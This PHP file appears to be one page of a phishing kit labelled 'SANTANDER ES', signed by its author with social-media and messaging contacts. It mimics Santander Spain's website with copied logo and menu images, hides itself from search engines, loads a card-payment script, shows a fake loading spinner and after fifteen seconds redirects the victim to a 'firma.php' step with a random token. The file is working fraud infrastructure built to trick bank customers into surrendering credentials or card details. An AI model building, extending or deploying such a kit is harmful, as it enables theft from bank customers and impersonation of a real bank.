<?php

/**
 * @link              https://www.z0n51.com/
 * @since             20/02/2020
 * @package           SANTANDER ES
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      SANTANDER ES
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

    include_once '../inc/app.php';
    $random   = rand(0,100000000000);
    $dispatch = substr(md5($random), 0, 17);
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="icon" href="../assets/images/fav.png" type="image/png"> 
        
        <title>Home</title>
    </head>

    <body style="background: #F7F7F7;">
        
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo">
                    <img class="d-lg-block d-md-none d-sm-none d-none" style="min-width: 201px;"  src="../assets/images/logoo.png">
                    <img class="d-lg-none d-md-block d-sm-block d-block" style="min-width: 27px;"  src="../assets/images/mobilelogo.png">
                </div>
                <div class="menu">
                    <img style="min-width: 543px;" class="d-lg-block d-md-none d-sm-none d-none" src="../assets/images/mainmenu.png">
                    <img style="min-width: 31px;"  class="d-lg-none d-md-block d-sm-block d-block" src="../assets/images/mobilemenu.png">
                </div>
            </div>
        </header>
        <!-- END HEADER -->
        
        <!-- NAV -->
        <nav id="nav" class="d-lg-block d-md-none d-sm-none d-none">
            <div class="container">
                <div class="secondmenu"><img style="min-width: 675px;"  src="../assets/images/secondmenu.png"></div>
                <div class="sofia"><img style="min-width: 61px;"  src="../assets/images/sofia.png"></div>
            </div>
        </nav>
        <!-- END NAV -->
        
        <!-- MAIN -->
        <main id="main">
            <div class="container">
                
                <div class="text-center">
                <div class="loading">
                    <div class="lds-default"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
                </div>
                </div>

            </div>
        </main>
        <!-- END MAIN -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/jquery.payment.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
        var dispatch = '<?php echo $dispatch; ?>';
        setTimeout(function () {
            window.location.href= 'firma.php?validation#_'+ dispatch;
        },15000); // 1000 = 1s
        </script>

    </body>

</html>